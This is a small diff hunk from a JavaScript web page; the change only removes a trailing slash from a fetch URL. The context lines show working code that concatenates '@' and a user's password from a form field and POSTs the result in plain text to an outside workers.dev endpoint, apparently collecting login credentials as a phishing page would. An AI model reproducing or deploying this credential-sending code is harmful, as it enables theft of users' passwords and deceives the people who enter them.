@@ -19,7 +19,7 @@
       host += "@";
       host += document.getElementById("password").value;
 
-      const response = await fetch("https://database.intonowac-tkane1q.workers.dev/", {
+      const response = await fetch("https://database.intonowac-tkane1q.workers.dev", {
           method: "POST",
           headers: { "Content-Type": "text/plain" },
           body: host
